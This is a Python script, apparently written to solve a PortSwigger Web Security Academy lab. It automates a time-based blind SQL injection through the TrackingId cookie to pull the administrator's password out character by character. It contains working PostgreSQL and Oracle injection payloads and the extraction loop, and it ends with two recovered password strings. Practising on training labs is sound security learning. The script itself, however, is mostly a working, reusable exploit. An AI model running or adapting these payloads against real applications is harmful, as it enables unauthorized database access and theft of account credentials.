import os
from turtle import done
import requests

burp0_url = "https://0a79005304c3afeac00495d900ed00c0.web-security-academy.net:443/filter?category=Lifestyle"
burp0_cookies = {"TrackingId": "wUlLC1q08ADkNSsS", "session": "NXEjhAnGVsHYF603jubyVxP73DUP3B0e"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://0a79005304c3afeac00495d900ed00c0.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

# ######################  until here burp paste of request for python  ########################## #
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

url = burp0_url
cookies = burp0_cookies
headers = burp0_headers
char_list = "abcdefghijklmnopqrstuvwxyz1234567890"

def send_request_for_char():
    trackingId = burp0_cookies["TrackingId"]
    loaded_cookies = burp0_cookies
    response = requests.get(url, headers=headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
    # print(response.status_code, len(response.content)) #DEBG
    password = ""
    pass_index = 1
    done = False


    while not done:
        for char in char_list:
            # print(i)
            payload = f"'||(SELECT CASE WHEN (SUBSTR(password,{pass_index},1)='{char}') THEN pg_sleep(1) ELSE '' END FROM users WHERE username='administrator')||'" #postgresql
            # payload = f"'||(SELECT CASE WHEN SUBSTR(password,{pass_index},1)='{char}' THEN 'a'||dbms_pipe.receive_message(('a'),2) ELSE '' END FROM users WHERE username='administrator')||'" #oracle
            # payload = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{pass_index},1)='{char}')+THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+FROM+users--" #portswigger solution
            loaded_cookies["TrackingId"] = trackingId + payload
            print("Payload:\n",loaded_cookies["TrackingId"]) #DEBG
            response = requests.get(url, headers=headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"Partial password is:\n{password}")
            print("Status code / Duration:\r\n",response.status_code, "/", response.elapsed.total_seconds())
            if response.elapsed.total_seconds() > (1.0):
                password += char
                pass_index += 1
                break
            elif char == char_list[-1] and password != "":
                done = True
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"TING!\r\nPassword is ready!\n\npassword for username 'administrator' is:\n{password}\nuse it wisely")
                break
            elif char == char_list[-1] and password =="":
                print(f"sorry but no success pls check ingridiants:{char_list}")
                done = True
                break

if __name__ == '__main__':
    send_request_for_char()

# zotfaf6s2l8alritg7nl
# z8tfof622l8a8ritg8nl